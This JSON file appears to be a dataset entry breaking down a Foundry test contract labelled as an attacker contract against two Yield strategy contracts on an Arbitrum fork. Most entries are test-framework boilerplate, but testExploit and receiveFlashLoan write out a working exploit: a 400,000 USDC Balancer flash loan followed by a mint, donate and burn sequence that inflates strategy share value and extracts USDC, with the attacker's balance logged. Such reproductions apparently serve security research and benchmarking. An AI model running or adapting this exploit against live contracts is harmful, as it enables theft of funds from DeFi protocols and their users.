[
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata fees,\n        bytes calldata userData\n    ) external {\n        USDC.transfer(address(YieldStrategy_1), 308_000 * 1e6);\n        YieldStrategy_1.mintDivested(address(this)); // mint pool token with USDC\n\n        uint256 transferAmount = YieldStrategy_1.balanceOf(address(this)) / 2;\n        YieldStrategy_1.transfer(address(YieldStrategy_2), transferAmount);\n        YieldStrategy_2.mint(address(YieldStrategy_2)); // mint strategy token\n\n        YieldStrategy_1.transfer(address(YieldStrategy_2), YieldStrategy_1.balanceOf(address(this))); // donate pool token to strategy token vault\n        YieldStrategy_2.burn(address(this)); // burn strategy token to get pool token\n\n        YieldStrategy_2.mint(address(YieldStrategy_2)); // recover donated pool token\n        YieldStrategy_2.burn(address(this));\n\n        YieldStrategy_1.transfer(address(YieldStrategy_1), YieldStrategy_1.balanceOf(address(this)));\n        YieldStrategy_1.burnDivested(address(this)); // burn pool token to USDC\n\n        USDC.transfer(address(Balancer), amounts[0]);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", blocknumToForkFrom);\n        vm.label(address(YieldStrategy_1), \"YieldStrategy_1\");\n        vm.label(address(YieldStrategy_2), \"YieldStrategy_2\");\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(USDC), \"USDC\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Yield",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Implement exploit code here\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(USDC);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 400_000 * 1e6;\n        bytes memory userData = \"\";\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        // Log balances after exploit\n        emit log_named_decimal_uint(\n            \" Attacker USDC Balance After exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n",
    "description": ""
  }
]